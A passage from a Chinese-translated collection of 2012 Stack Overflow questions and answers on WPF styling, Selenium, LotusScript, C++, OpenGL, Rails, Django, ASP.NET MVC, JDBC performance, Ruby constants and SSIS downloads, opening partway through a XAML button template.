                            <EasingDoubleKeyFrame KeyTime="0" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleY)" Storyboard.TargetName="ellipse">
                            <EasingDoubleKeyFrame KeyTime="0" Value="-1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.X)" Storyboard.TargetName="ellipse">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.Y)" Storyboard.TargetName="ellipse">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[2].(RotateTransform.Angle)" Storyboard.TargetName="ellipse">
                            <EasingDoubleKeyFrame KeyTime="0" Value="180"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleX)" Storyboard.TargetName="glow">
                            <EasingDoubleKeyFrame KeyTime="0" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleY)" Storyboard.TargetName="glow">
                            <EasingDoubleKeyFrame KeyTime="0" Value="1"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.X)" Storyboard.TargetName="glow">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.Y)" Storyboard.TargetName="glow">
                            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleX)" Storyboard.TargetName="grid">
                            <EasingDoubleKeyFrame KeyTime="0:0:0.4" Value="0.784"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[0].(ScaleTransform.ScaleY)" Storyboard.TargetName="grid">
                            <EasingDoubleKeyFrame KeyTime="0:0:0.4" Value="0.784"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.X)" Storyboard.TargetName="grid">
                            <EasingDoubleKeyFrame KeyTime="0:0:0.4" Value="-4.231"/>
                        </DoubleAnimationUsingKeyFrames>
                        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[3].(TranslateTransform.Y)" Storyboard.TargetName="grid">
                            <EasingDoubleKeyFrame KeyTime="0:0:0.4" Value="4.292"/>
                        </DoubleAnimationUsingKeyFrames>
                    </Storyboard>
                    <Storyboard x:Key="isPressed"/>
                </ControlTemplate.Resources>
                <Grid x:Name="grid" Height="Auto" Width="Auto" Margin="0.068,0.333,-0.264,0.666" RenderTransformOrigin="0.5,0.5">
                    <Grid.RenderTransform>
                        <TransformGroup>
                            <ScaleTransform/>
                            <SkewTransform/>
                            <RotateTransform/>
                            <TranslateTransform/>
                        </TransformGroup>
                    </Grid.RenderTransform>
                    <Ellipse x:Name="ellipse2" Margin="-0.106,0.018,0.106,-0.018" Stroke="#FF555453" Height="Auto" VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Width="Auto" StrokeThickness="0" RenderTransformOrigin="0.5,0.5">
                        <Ellipse.RenderTransform>
                            <TransformGroup>
                                <ScaleTransform/>
                                <SkewTransform/>
                                <RotateTransform/>
                                <TranslateTransform/>
                            </TransformGroup>
                        </Ellipse.RenderTransform>
                        <Ellipse.Fill>
                            <RadialGradientBrush RadiusX="0.426269" RadiusY="0.426269" Center="0.488153,0.0751377" GradientOrigin="0.488153,0.0751377">
                                <GradientStop Color="#FFDCD7D3" Offset="0"/>
                                <GradientStop Color="#FFBDB9B5" Offset="0.576744"/>
                                <GradientStop Color="#FF9E9B98" Offset="0.767442"/>
                                <GradientStop Color="#FF4B4A49" Offset="1"/>
                            </RadialGradientBrush>
                        </Ellipse.Fill>
                    </Ellipse>
                    <Ellipse x:Name="ellipse" Margin="1.796,2.097,2.008,2.061" Width="Auto" RenderTransformOrigin="0.5,0.5" HorizontalAlignment="Stretch" Height="Auto">
                        <Ellipse.RenderTransform>
                            <TransformGroup>
                                <ScaleTransform ScaleY="-1"/>
                                <SkewTransform/>
                                <RotateTransform Angle="180"/>
                                <TranslateTransform/>
                            </TransformGroup>
                        </Ellipse.RenderTransform>
                        <Ellipse.Fill>
                            <LinearGradientBrush StartPoint="0.5,0" EndPoint="0.5,1">
                                <GradientStop Color="#FF898989" Offset="0"/>
                                <GradientStop Color="#FF727272" Offset="0.132447"/>
                                <GradientStop Color="#FF5C5C5C" Offset="0.32093"/>
                                <GradientStop Color="#FF060606" Offset="1"/>
                            </LinearGradientBrush>
                        </Ellipse.Fill>
                    </Ellipse>

                    <Ellipse x:Name="glow" Margin="1.831,2.138,2.045,2.102" Visibility="Visible" VerticalAlignment="Stretch" HorizontalAlignment="Stretch" RenderTransformOrigin="0.5,0.5">
                        <Ellipse.RenderTransform>
                            <TransformGroup>
                                <ScaleTransform/>
                                <SkewTransform/>
                                <RotateTransform/>
                                <TranslateTransform/>
                            </TransformGroup>
                        </Ellipse.RenderTransform>
                        <Ellipse.Fill>
                            <RadialGradientBrush RadiusX="0.412293" RadiusY="0.41654" Center="0.300546,0.229947" GradientOrigin="0.300546,0.229947">
                                <RadialGradientBrush.RelativeTransform>
                                    <TransformGroup>
                                        <SkewTransform CenterX="0.300546" CenterY="0.229947" AngleX="-1.08514" AngleY="0"/>
                                        <RotateTransform CenterX="0.300546" CenterY="0.229947" Angle="238.875"/>
                                    </TransformGroup>
                                </RadialGradientBrush.RelativeTransform>
                                <GradientStop Color="#A4FFFAFF" Offset="0"/>
                                <GradientStop Color="#52FFFCFF" Offset="0.40678"/>
                                <GradientStop Color="#00FFFFFF" Offset="1"/>
                            </RadialGradientBrush>
                        </Ellipse.Fill>
                    </Ellipse>
                    <Ellipse x:Name="ellipse1" Height="8.982" Margin="-7.773,0,-5.394,-9" VerticalAlignment="Bottom" Opacity="0" d:IsHidden="True">
                        <Ellipse.Fill>
                            <RadialGradientBrush>
                                <GradientStop Color="#00000000" Offset="1"/>
                                <GradientStop Color="#FF5F5F5F" Offset="0"/>
                                <GradientStop Color="#7F2F2F38" Offset="0.605"/>
                                <GradientStop Color="#4C141418" Offset="0.824"/>
                            </RadialGradientBrush>
                        </Ellipse.Fill>
                    </Ellipse>                      
                </Grid>
                <ControlTemplate.Triggers>
                    <Trigger Property="IsCancel" Value="False"/>
                    <Trigger Property="IsMouseOver" Value="True">
                        <Trigger.ExitActions>
                            <StopStoryboard BeginStoryboardName="Storyboard1_BeginStoryboard"/>
                        </Trigger.ExitActions>
                        <Trigger.EnterActions>
                            <BeginStoryboard x:Name="Storyboard1_BeginStoryboard" Storyboard="{StaticResource Storyboard1}"/>
                        </Trigger.EnterActions>
                    </Trigger>
                    <Trigger Property="IsPressed" Value="True">
                        <Trigger.ExitActions>
                            <StopStoryboard BeginStoryboardName="isPressed_BeginStoryboard"/>
                        </Trigger.ExitActions>
                        <Trigger.EnterActions>
                            <BeginStoryboard x:Name="isPressed_BeginStoryboard" Storyboard="{StaticResource isPressed}"/>
                        </Trigger.EnterActions>
                    </Trigger>
                    <EventTrigger RoutedEvent="FrameworkElement.Loaded"/>
                    <Trigger Property="IsKeyboardFocused" Value="true"/>
                    <Trigger Property="ToggleButton.IsChecked" Value="true"/>
                    <Trigger Property="IsEnabled" Value="false">
                        <Setter Property="Foreground" Value="#ADADAD"/>
                    </Trigger>
                </ControlTemplate.Triggers>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T01:08:45.767

我不认为你能做到这一点。我认为您需要使用派生样式中的其他形状重新定义控件模板。

# c# - Selenium Javascript 不会检索值

> ID：10078701
> 
> 赞同：0
> 
> 时间：2012-04-09T19:34:33.503
> 
> 标签：c#, asp.net, visual-studio-2010, dom, selenium

我正在编写一个网页，它使用 Selenium WebDriver 来检索另一个页面上的输入内容。

这是我要从中检索信息的页面上的输入字段：

```
<input id="ReviewProposal_OwnerName" name="ReviewProposal.OwnerName" readonly="readonly" type="text" value="" /> 
```

这是在我要从中检索信息的页面上分配输入的脚本：

```
$('#ReviewProposal_OwnerName').val(data.Owner1); 
```

为了检索该值，我在使用驱动程序导航到该页面后写道：

```
 IJavaScriptExecutor js = driver as IJavaScriptExecutor;

IWebElement nameOfOwnerField = driver.FindElement(By.Id("ReviewProposal_OwnerName"));

string title = (string)js.ExecuteScript("return $('#ReviewProposal_OwnerName').val();");
output.InnerText += title; 
```

输出是我写的页面上的一个 div。

然而，即使文本显示在页面的输入字段中，当我尝试通过我的代码检索它时，我总是得到一个空字符串。如果我查看 firebug 中的输入字段，即使调试器中的值标记为空白，文本也会显示在浏览器中。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-02T15:58:14.960

也许是因为您的输入是只读的，而 jQuery 无法设置其值。

# lotus-notes - 当用户退出拼写检查对话框时停止保存/发送文档

> ID：10078702
> 
> 赞同：0
> 
> 时间：2012-04-09T19:34:39.913
> 
> 标签：lotus-notes, lotusscript

我有一个带有基本保存按钮的表单。在保存按钮中是一些用于启动拼写检查对话框的代码。

```
Call uidoc.SpellCheck 
```

有没有办法可以从对话框中捕获返回码？具体来说，如果用户使用右上角的 X 来“退​​出”拼写检查对话框，我希望停止保存。

我正在寻找的是对话框可以为我提供什么类型的退出代码来停止保存。我没有在文档中看到任何内容，而且 LotusScript 的在线帮助比其他语言更难获得。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T20:56:04.953

根据我的经验，SpellCheck 方法级别太高，无法提供任何可以编程的有用返回代码。它会简单地运行操作然后返回。

[这是一个](http://searchdomino.techtarget.com/tip/Accessing-the-Notes-mail-send-spell-check-dialog-box)可能有帮助的帖子。除了使用 uidoc.SpellCheck 方法，您还可以选择启用“自动检查邮件是否拼写错误”选项，该选项提供“取消发送”按钮。然后只需调用保存/发送文档即可触发拼写检查，并允许用户在出现拼写错误时取消发送。那是假设这是您所追求的行为。

# c++ - 堆栈列表类的重载 >> 运算符

> ID：10078703
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:34:40.200
> 
> 标签：c++, stack, cin

```
LongInt i1; 

cin >> i1; 
```

其中 LongInt 是一个包含整数堆栈的类。我想将输入存储到类的堆栈中，我假设这意味着我必须在类文件中重载 >> 运算符。问题是我不确定如何将诸如 cin >> "111343241" 之类的输入逐位推送到堆栈中。我将如何进行这项工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:42:34.253

要重载运算符本身，实现 get 循环，定义一个命名空间范围

```
std::istream& operator >>(std::istream& is, LongInt& li) {
    char c;
    while( is.get(c).good() ) {
        if( !std::isdigit(c) ) {
             is.unget();
             break;
        }

        ...push it to li
    }

    return is;
} 
```

如何将单个数字推送到 LongInt 取决于 LongInt 的实现。

# javascript - 如何在网站上检索 Spotify 播放列表元数据？

> ID：10078709
> 
> 赞同：1
> 
> 时间：2012-04-09T19:35:11.567
> 
> 标签：javascript, html, spotify

我正在尝试从网站上的 Spotify 播放列表中检索一些元数据，而不是在 Spotify 应用程序中启动。我在野外看到的一个例子是一个名为[ShareMyPlaylists](http://sharemyplaylists.com/)的网站。

它能够检索播放列表名称、曲目数量、持续时间、曲目列表等。有谁知道像这样的网站是如何获得这些元数据的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:56:14.190

您可以从 spotify.com 获取 spotify api。

它不适用于纯 javascript，您还需要服务器端脚本。

这里有所有 api 的链接：[http ://www.spotify.com/se/about/spotify-on-the-web/developer-resources/](http://www.spotify.com/se/about/spotify-on-the-web/developer-resources/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:46:14.443

你需要这个：[https ://github.com/liesen/spotify-api-server](https://github.com/liesen/spotify-api-server)

# java - Java - GluProject 如何处理旋转

> ID：10078711
> 
> 赞同：0
> 
> 时间：2012-04-09T19:35:22.650
> 
> 标签：java, glut

我正在尝试在我的游戏中使用 gluProject。我找到了一种使用它的方法，但我不知道如何处理轮换。

这是我制作的代码：

```
public static Vector2 getScreenCoordinates(float x, float y, float z, int height, int width)
{
    FloatBuffer screen_coords = GLAllocation.createDirectFloatBuffer(4);
    IntBuffer viewport = GLAllocation.createDirectIntBuffer(16);
    FloatBuffer modelview = GLAllocation.createDirectFloatBuffer(16);
    FloatBuffer projection = GLAllocation.createDirectFloatBuffer(16);

    GL11.glGetFloat(2982, modelview);
    GL11.glGetFloat(2983, projection);
    GL11.glGetInteger(2978, viewport);

    boolean result = GLU.gluProject(x, y, z, modelview, projection, viewport, screen_coords);
    if (result)
    {
        float screen_x = screen_coords.get(0);
        float screen_y = screen_coords.get(1);
        float scrren_z = screen_coords.get(2);

        screen_y -= height / 2;
        screen_y = -screen_y;
        screen_y += height / 2;

        return new Vector2(screen_x, screen_y);
    }
    else
    {
         System.out.printf("Failed to convert 3D coords to 2D screen coords");
         return null;
    }
} 
```

所以`x`和是我的 3D 地图`y`中`z`的坐标。`height`并且`width`是我的窗口大小。

如何修改它以处理旋转（偏航和俯仰）？

谢谢。

* * *

这是我的新代码：

```
public Vector2 worldToScreen(double x, double y, double z, int yaw, int pitch)
{   
    // Initialize the result buffer
    FloatBuffer screen_coords = GLAllocation.createDirectFloatBuffer(4);

    // Init the OpenGL buffers
    IntBuffer viewport = GLAllocation.createDirectIntBuffer(16);
    FloatBuffer modelview = GLAllocation.createDirectFloatBuffer(16);
    FloatBuffer projection = GLAllocation.createDirectFloatBuffer(16);

    // Add the rotation
    GL11.glRotatef(yaw, 0, 0, 1);
    GL11.glRotatef(pitch, 1, 0, 0);

    // Get the OpenGL data
    GL11.glGetFloat(2982, modelview);
    GL11.glGetFloat(2983, projection);
    GL11.glGetInteger(2978, viewport);

    // Remove the rotation
    GL11.glRotatef(-yaw, 0, 0, 1);
    GL11.glRotatef(-pitch, 1, 0, 0);

    // Calculate the screen position
    boolean result = GLU.gluProject(x, y, z, modelview, projection, viewport, screen_coords);

    if (result)
    {
        if ( (screen_coords.get(0) < -1.0f) || (screen_coords.get(0) > 1.0f) || (screen_coords.get(1) < -1.0f) || (screen_coords.get(1) > 1.0f) )
            return null;

        int window_half_width = getWidth() / 2;
        int window_half_height = getHeight() / 2;

        int screen_x = window_half_width + (window_half_width * -screen_coords.get(0));
        int screen_y = window_half_height + (window_half_height * screen_coords.get(1));

        System.out.printf("(Full Screen / No bounds) [" +x+ ", " +y+ ", " +z+ "] gives [" +screen_coords.get(0)+ ", " +screen_coords.get(1)+ "]");
        System.out.printf("(Every Time) [" +x+ ", " +y+ ", " +z+ "] gives [" +screen_x+ ", " +screen_y+ "]");
        return new Vector2(screen_x, screen_y);
    }
    else
    {
        System.out.printf("Failed to convert 3D coords to 2D screen coords");
        return null;
    }
} 
```

那是对的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T11:38:32.940

Yaw 是围绕 y 轴的旋转（指向上方），pitch 是围绕 x 轴的旋转。

```
GL11.glRotatef(pitch, 1, 0, 0);
GL11.glRotatef(yaw, 0, 1, 0); 
```

推送/弹出投影矩阵也可能更快，并且您应该处于正确的矩阵模式。（您的模型视图矩阵和投影矩阵都必须正确）。

```
GL11.glPushMatrix();
// Camera rotations
GL11.glPopMatrix(); 
```

但是，为什么您需要撤消相机转换是值得怀疑的。您可能应该每帧或视口只应用一次它们。使用该视图渲染场景，然后获取投影坐标，然后更改为 2D 渲染模式。

# 更新

如果您使用相机的滚动、俯仰和偏航来表示它们在 OpenGL 坐标系中的实际含义——相对于相机，我会更喜欢它。关键是，只要您正确设置了相机模型视图和投影矩阵，就可以投影该点。您一定已经在某处设置了相机。您将能够查看这是否正确，因为您可以看到结果。应用该转换，您将知道它是正确的。

它是否正确？有可能？你必须**应用所有的转换**。完全相同的转换为您提供您在游戏中看到的相机视图。这包括**所有平移和旋转**。你会知道你是否正确，因为你应该已经在游戏中应用了这些转换。

但是，您需要考虑的是，手头的相机投影矩阵是什么？如果你不知道，调用 glLoadIdentity() 清除它，然后调用你的相机转换逻辑。您需要一个准确的模型视图和投影矩阵 -**与您在游戏中使用的完全相同的相机设置**。如果您的模型视图或投影矩阵处于错误状态，它将无法正常工作。

# ruby-on-rails-3.1 - 使用 Sendgrid on Rails 3.1.3 通过 smtp 发送电子邮件中的非法字符

> ID：10078713
> 
> 赞同：1
> 
> 时间：2012-04-09T19:35:23.740
> 
> 标签：ruby-on-rails-3.1, heroku, sendgrid

我正在从 gmail 导入联系人列表，并使用复选框选择返回的电子邮件，并在用户被选中后向用户发送邀请。当我查看我的日志时，输出的电子邮件格式正确，一切似乎都很好。

当我在 Sendgrid 上查看我的电子邮件活动时，我看到电子邮件地址附加了额外的字符，因此使其失败。我使用 sendmail 与其他邮寄者发送电子邮件没有任何问题，但这个似乎添加了这些额外的字符，我不知道它们来自哪里。

有没有其他人看到这种情况发生？或者对如何解决这个问题有建议？

预期结果邮箱：test@gmail.com

实际结果邮箱：“test@gmail.com”@i04-01

user_mailer

```
def invitation(email_addresses)
@host = ((Rails.env == "production") ? "http://www.test.com" : "http://localhost:3000")
attachments.inline['people.jpg'] = File.read("#{Rails.root}/app/assets/images/people.jpg")
#attachments.inline['people.jpg'] = File.read("#{Rails.root}/app/assets/images/Girl.jpeg")
email_addresses.each do |email|
  mail(:to => email, :subject => "Hello from test!")
end 
```

结尾

用户控制器

```
def import
#@user = User.find(params[:id])
#@users = User.find(session[:user_id])
begin
  @sites = {"gmail" => Contacts::Gmail, "yahoo" => Contacts::Yahoo, "hotmail" => Contacts::Hotmail}
  @contacts = @sites[params[:from]].new(params[:login], params[:password]).contacts
  @users, @no_users = [], []
  @contacts.each do |contact|
    #if u = User.find(:first , :conditions => @users.email = �#{contact[1]}� , :include =>[:user])
    if u = User.find(:first, :conditions => "email = '#{contact[1]}'")
      @users << u
    else
      @no_users << {:name => contact[0], :email => contact[1]}
    end
  end

  #if @contacts.save
  #end

  respond_to do |format|
    format.html { render :template => 'shared/_contact_list', :layout => false }
    format.xml { render :xml => @contacts.to_xml }
  end
end 
```

结尾

```
def send_bulk_mail
name_email =[]
email_addresses=[]
names=[]
post=params[:post]
post.each do |k,v|
  if v=="1"
    name_email << k
  end
end
name_email.each do |n|
  email_addresses << n.split(",")[1]
end
UserMailer.invitation(email_addresses).deliver 
```

结束 谢谢

# django - django - 将 db 从 sqlite3 转换为 postgres 时出现加载数据错误

> ID：10078721
> 
> 赞同：10
> 
> 时间：2012-04-09T19:35:56.107
> 
> 标签：django, postgresql, django-models, postgresql-9.1, django-database

我正在尝试从 sqlite3 db 转换为 Postgres（这样我就可以使用 django 1.4 获得时区感知的日期时间字段）。我从 sqlite3 数据库中转储了数据。然后切换设置以指向空的 postgres 数据库。然后运行syncdb，然后是南迁移。到目前为止一切都很好。

当我尝试将转储的数据重新加载到 postgres 中时，出现错误：

加载数据时发生异常：重复键值违反唯一约束“django_content_type_app_label_model_key”详细信息：键（app_label，模型）=（django_twilio，调用者）已经存在。

我从应用程序中删除了 twilio，但仍然遇到类似的错误，只是数据库中的下一个对象。

任何帮助表示赞赏。我是编程和 django 的新手。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T20:14:35.773

是姜戈。我实际上在现有的 stackexchange 帖子中找到了答案：

[加载数据转储时，将 Django 项目从 sqlite3 后端切换到 postgresql 失败](https://stackoverflow.com/questions/3076928/switching-django-project-from-sqlite3-backend-to-postgresql-failes-when-loading)

我需要截断数据库。感谢您的帮助。

# ruby-on-rails - rails，对 URI 和控制器的一般理解

> ID：10078726
> 
> 赞同：0
> 
> 时间：2012-04-09T19:36:25.370
> 
> 标签：ruby-on-rails, routes, anchor

我有一个消息模型和控制器。在其中，我有索引、显示等标准功能。

当我转到“localhost:3000/messages”时，会显示我的 index.html.erb，这反过来会呈现我的部分 _messages.html.erb。

在那里，我有一个锚href

```
<a href= "received_messages">Received Messages</a> 
```

但是，我遇到了 2 个问题。

received_messages 没有附加 URL，我认为它通常会这样做，除非我在开​​头添加 /。我如何让它附加？

还有..如果我手动输入“localhost:3000/messages/received_messages”，我会不断被重定向到messages#show函数。为什么一般是这样？

我有一个 received_messages.html.erb 甚至在我的路线中，我有

```
match '/received_messages', to: 'messages#received_messages' 
```

我的控制器中也有函数#received_messages。

为什么它不断被重定向到消息#show

非常感谢=）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:48:49.323

您询问：

> 如果我手动输入“localhost:3000/messages/received_messages”，我会不断被重定向到 messages#show 函数。为什么一般是这样？

一般来说，你有“消息”的想法......并且

1.  查看消息集合，您将转到“/messages”
2.  要查看特定消息（ID 为 56），您将转到“/messages/56”
3.  要编辑，“/messages/56/edit”
4.  创建一个新的：“/messages/new”

因此，当您转到 /messages/received_messages 时，系统正在尝试显示 ID 为“received_messages”的消息

如果您想对消息集合进行操作，您可以设置您的路线，例如：

```
resources :messages do
  collection do
    get :received
  end
end 
```

这将匹配“/messages/received”，并运行 MessagesController#received 操作，并呈现 app/views/messages/received.html.erb 文件。

# ruby - Ruby 中的 UPnP 媒体服务器控制点

> ID：10078733
> 
> 赞同：2
> 
> 时间：2012-04-09T19:36:52.390
> 
> 标签：ruby, upnp

我正在寻找任何在 Ruby 中实现 UPnP 取得相当成功的人。在这个主题上似乎很少有连贯和完整的。

我一直在使用来自[Seattlerb的](https://github.com/seattlerb/upnp)[UPnP gem](http://rubygems.org/gems/UPnP)。我认为这可能是最好的，但它是不完整的，因为文档有些有限（尽管比我发现的其他任何东西都要好），而且我认为协议的某些方面没有实现。所以，我以此为起点。

我正在尝试编写一个“ *UPnP MediaServer ControlPoint* ”，它将检测网络上的 UPnP 服务器并提供有关存储在那里的媒体的信息，并提供一种将该媒体下载到本地硬盘驱动器的方法。实际上播放此类媒体不是必需的对于这个应用程序：它只是一个从作为 DLNA 媒体服务器的 PVR 上抓取录音的工具。

我有 UPnP gem 在 ruby​​ 1.9.3 下工作。我必须进行一些代码更改才能使其正常工作，并且我的代码更改可能不完整，因为我没有超越简单的设备和服务发现。

我现在要做的是与发现的设备进行交互以获取其可用内容的列表，然后访问该内容。然而，经过几天的互联网搜索、阅读 UPnP 设备架构文档、逆向工程在互联网上找到的代码位（包括 UPnP gem），我不清楚下一步该去哪里。

我在这里发帖是希望其他人已经走过这条路，并愿意为我指明一个合适的方向......

如果它对其他人有帮助，我的评估工作在[github 上](https://github.com/starfry/UPnP-Ruby-1.9-Evaluation)。

# c# - 我怎样才能调用一个动作并输出它的结果，就好像它是一个“用户控件”一样？

> ID：10078736
> 
> 赞同：0
> 
> 时间：2012-04-09T19:37:12.197
> 
> 标签：c#, asp.net-mvc-3, view

在我的`_Layout.cshtml`文件中，我想调用如下内容：

```
 <div id="content">
        <div id="left-wrapper" class="box">
            @Html.Action("FreeThisWeek", "Products")
            @RenderBody()
        </div>
    </div> 
```

这是我的 ProductsController 文件：

```
[ChildActionOnly]
public ActionResult FreeThisWeek()
{
    //Some code that fetches the data and builds the model.
    var model = BuildFreeProducts();
    return View(model);
} 
```

如果我尝试运行此代码，我会得到一个，`StackOverflowException`因为 Action 返回 View()，它要求布局，它运行返回 View() 的 Action，依此类推。

可以理解，但是我该如何完成这个正确的代码呢？

我在哪里编写将这个数据模型与我编写的 HTML 复合的视图？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:43:32.333

尝试返回`PartialView("yourview",model)`。确保您返回的视图没有将此页面用作布局。`@{Layout=null}`您可以通过在要返回的视图顶部使用来指定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:50:58.997

您将在`FreeThisWeek`Action 内返回 View 并在再次使用 _Layout 的 View 内返回。所以它变成递归的。

转到您的`FreeThisWeek`视图并将布局设置为空

```
@{
   Layout=null;
} 
```

# java - ResultSetExtractor 中 getInt 的性能问题

> ID：10078737
> 
> 赞同：6
> 
> 时间：2012-04-09T19:37:23.943
> 
> 标签：java, mysql, performance, spring, jdbc

我在 ResultSetExtractor 中调用 getInt 时遇到性能问题。GetInt 被调用 20000 次。一次调用花费 0.15 毫秒，总花费为 24 秒，同时在分析器内部运行。SQL 语句的执行大约需要 8 秒（通过主键访问）。我用的mysql驱动版本5.1.13，mysql server 5.1.44和spring-jdbc-3.1.1你有提高性能的想法吗？

```
 mut.getMutEffect()[0]=(rs.getInt("leffect_a") != 0);
    mut.getMutEffect()[1]=(rs.getInt("leffect_c") != 0);
    ...
    mut.getMutEffect()[19]=(rs.getInt("leffect_y") != 0);
    mut.getMutReliability()[0]=rs.getInt("lreliability_a");
    ...
    mut.getMutReliability()[19]=rs.getInt("lreliability_y"); 
```

我的方案看起来像这样

```
CREATE TABLE mutation (
 ...
 leffect_a BIT NOT NULL,
 lreliability_a TINYINT UNSIGNED NOT NULL,
 ...
 leffect_y BIT NOT NULL,
 lreliability_y TINYINT UNSIGNED NOT NULL,
 ...
) ENGINE=MyISAM; 
```

编辑：在 getInt 中调用 getIntWithOverflowCheck 方法，这似乎很昂贵。是否可以关闭此检查？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T20:23:27.310

以下是一些建议：

*   将获取大小设置为一个相当大的数字：[Statement.setFetchSize()](http://docs.oracle.com/javase/6/docs/api/java/sql/Statement.html#setFetchSize%28int%29)。这应该会减少处理结果集时到数据库服务器的往返次数。

*   通过分析确保选择语句是最佳的

*   一般表优化，例如，您是否使用正确的数据类型？看起来您可以将 leffect_a 更改为 BOOLEAN

*   确保您没有在 SELECT 语句中返回任何不必要的列。

*   使用[PreparedStatement](http://docs.oracle.com/javase/6/docs/api/java/sql/PreparedStatement.html)

*   避免可滚动和可更新的结果集（都不是默认的）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:50:42.883

两个建议：

1.  `getMutEffect()`将和的结果存储`getMutReliability()`在局部变量中，因为它们被重复使用。热点 jit 可能会内联并删除重复的表达式，但我认为不依赖它更清楚。
2.  使用它们的 indizes 而不是列名来检索 ResultSet 的值可能会更快。您甚至可以创建要索引的名称的本地映射，奇怪的是对于某些 jdbc 驱动程序，这比让 ResultSet 进行映射要快。

# ruby - 访问常量

> ID：10078744
> 
> 赞同：6
> 
> 时间：2012-04-09T19:37:39.450
> 
> 标签：ruby, constants

为什么我不能从“A”访问下面的“B”，但可以从主环境访问？

```
module A; end
A.instance_eval{B=1}

B #=> 1
A::B #=> uninitialized 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:49:42.450

从（强调我的）的[文档中：`instance_eval`](http://apidock.com/ruby/BasicObject/instance_eval)

> 在接收器 (obj) 的上下文中评估包含 Ruby 源代码或给定块的字符串。**为了设置上下文，在代码执行时将变量 self 设置为 obj**，从而使代码可以访问 obj 的实例变量。

这里没有做更多的事情。特别是，常量赋值在块的封闭上下文中运行。观察：

```
irb(main):001:0> module A
irb(main):002:1>   module B; end
irb(main):003:1>   B.instance_eval { C = 1 }
irb(main):004:1> end
=> 1
irb(main):006:0> A::C
=> 1 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T19:54:47.343

### 因为 。. .

. . . 未在类或模块中定义的常量被赋予全局范围。

常量定义重要的是封闭的词法范围，而不是当前的接收者或`self`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-09T19:43:46.257

这样做的惯用方法是

```
 A.const_set(:B, 1)
 A::B #=> 1 
```

至于为什么它不起作用，在 Ruby 1.8 和 1.9.2+ 中（在 1.9.1 中有所不同），常量查找是词法范围的。我找到了一篇很好的[博客文章](http://jfire.posterous.com/constant-lookup-in-ruby)，里面有解释。去引用：

> 请注意，这些规则适用于常量定义和查找。在 1.8 和 1.9.2 中，定义在 class_evaluate 块中的常量将定义在封闭的词法范围内，而不是接收方的范围内。

对于`instance_eval`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T23:42:01.187

```
module A; end
A.class_eval{B=1}
B # Undefined
A::B # 1 
```

至于它为什么起作用，我不太确定。在创建诸如 Small Eigen Collider 之类的元框架时，我偶尔会使用这样的元编程，但不会在日常工作中使用。

# file - 什么 SSIS 任务可用于从 HTTPS URL 下载文件？

> ID：10078745
> 
> 赞同：5
> 
> 时间：2012-04-09T19:37:49.913
> 
> 标签：file, url, https, ssis, download

我对 SSIS 相当陌生，需要一些帮助来创建一个 SSIS 包，该包将连接到 HTTPS URL 并下载具有命名约定（如 2012-04-09.csv、2012-04-08.csv 等）的每日文件。任何关于如何使用 Web 服务、XML、FTP 或任何其他任务执行此操作的建议将不胜感激。谢谢！！

